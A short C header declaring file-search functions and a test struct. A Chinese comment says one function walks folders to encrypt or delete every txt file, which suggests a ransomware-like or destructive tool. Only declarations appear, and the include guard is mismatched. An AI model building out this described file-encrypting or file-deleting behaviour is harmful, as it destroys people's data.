#pragma once
#ifndef SEARCHFILE_H_INCLUDE
#define SEARCHFILE_H

void sfile(char* path);
DWORD* ssdikstr(void);
char* re_strtok(char *);
//遍历文件夹，遍历所有txt文件，加密或者删除
void find_all(char* path);
typedef struct _test
{
	char* t_char;
	char* t_str[3];
}testdef;
testdef test(void);
#endif // !SEARCHFILE_H_INCLUDE

